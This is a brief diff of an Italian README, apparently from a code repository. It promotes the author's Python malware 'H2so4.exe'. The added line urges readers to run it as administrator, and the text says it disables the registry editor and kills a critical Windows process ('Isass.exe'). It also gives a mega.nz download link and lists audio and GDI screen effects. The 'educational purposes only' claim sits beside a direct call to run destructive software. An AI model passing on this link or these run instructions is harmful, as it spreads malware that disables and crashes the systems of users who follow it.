@@ -1,4 +1,4 @@
-HO AGGIORNATO IL MIO MALWARE (H2so4.exe) , ho aggiunto che disattiva il regedit e taskill di Isass.exe.
+ESEGUITELO COME AMMINISTRATORE HO AGGIORNATO IL MIO MALWARE (H2so4.exe) , ho aggiunto che disattiva il regedit e taskill di Isass.exe.
 H2SO4 è un malware scritto in python SOLO A SCOPO EDUCATIVO. ECCO IL LINK PER IL DOWNLOAD PS SU GITHUB NON RIESCO A CARICARE IL FILE :( DATO IL SUO PESO.
 https://mega.nz/file/smVyCJjD#oFyMORfrSFl-jTlNuw_6AxVoFj1E4P1JcLDYIQr4DxI
 ABBIAMO EFFETTI AUDIO,QUADRATI GDI :
